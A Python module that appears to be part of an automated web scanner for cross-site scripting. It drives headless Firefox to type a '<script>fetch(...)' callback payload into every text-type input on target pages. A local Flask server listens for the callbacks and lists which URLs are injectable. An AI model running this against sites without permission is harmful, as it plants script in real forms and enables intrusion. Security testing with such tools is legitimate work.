from flask import Flask, request
import threading
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
import ssl
import socket



import os
os.environ['MOZ_HEADLESS'] = '1'
import logging
import flask.cli
flask.cli.show_server_banner = lambda *args, **kwargs: None

# Flask App for callback detection
app = Flask(__name__)
received_indices = set()
url_map = {}

CYAN = "\033[96m"
RED = "\033[31m"
GREEN = "\033[92m"
RESET = "\033[0m"
PURPLE = "\033[95m"

error = f"{RED}[!]{RESET}"

@app.route('/test', methods=['GET'])
def test_endpoint():
	index = request.args.get('index', '')
	if index and index.isdigit():
		index = int(index)
		url = url_map.get(index, "Unknown")
		received_indices.add(index)
		#print(f"{GREEN}[GOT]{RESET} Received XSS payload from {url}")
	return "Received"

def get_private_ip():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		# Doesn't actually need to connect — just to pick the right interface
		s.connect(("8.8.8.8", 80))
		ip = s.getsockname()[0]
		s.close()
		return ip
	except Exception:
		return "127.0.0.1"


def run_flask_server():
	# Disable SSL verification for self-signed cert
	#context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
	#context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')  # Use `adhoc` or generate your own
	log = logging.getLogger('werkzeug')
	log.setLevel(logging.ERROR)
	app.logger.disabled = True

	app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')

def run(targets):
	#debug
	#return {"success": False}

	global url_map, received_indices
	received_indices = set()
	url_map = {i + 1: url for i, url in enumerate(targets)}

	# Start the Flask server in a separate thread
	server_thread = threading.Thread(target=run_flask_server)
	server_thread.daemon = True
	server_thread.start()

	time.sleep(1.5)  # Allow server to start

	geckodriver_path = "/usr/local/bin/geckodriver"
	firefox_binary_path = "/usr/bin/firefox"

	options = webdriver.FirefoxOptions()
	options.headless = True
	options.binary_location = firefox_binary_path

	for index, url in url_map.items():
		#print(f"{PURPLE}[+]{RESET} Scanning {url}")
		service = Service(geckodriver_path)
		driver = webdriver.Firefox(service=service, options=options)
		try:
			driver.get(url)
			time.sleep(3)
			user_ip = get_private_ip()
			xss_payload = f'''<script>fetch('https://{user_ip}:8080/test?index={index}');</script>'''
			inputs = driver.find_elements(By.TAG_NAME, "input")
			#print(f"[+] Found {len(inputs)} input(s)")
			for input_element in inputs:
				try:
					input_type = input_element.get_attribute("type") or "text"
					if input_type in ["text", "search", "email", "password", "url", "tel", "number"]:
						driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
						input_element.clear()
						input_element.send_keys(xss_payload)
						input_element.send_keys(Keys.RETURN)
						#print(f"[+] Injected into input")
				except Exception:
					pass
					#print(f"{error} Error injecting into input")
		except Exception:
			pass
			#print(f"{error} Error loading URL")
		finally:
			driver.quit()
			time.sleep(2)  # Give time for the callback to hit the server

	# Give extra time for late callbacks
	#print("[*] Waiting 5s for callbacks...")
	time.sleep(5)

	vulnerable_urls = [url_map[i] for i in sorted(received_indices)]
	if vulnerable_urls:
		result = {"success": True, "xss_injectables": vulnerable_urls}
	else:
		result = {"success": False, "xss_injectables": vulnerable_urls}

	return result
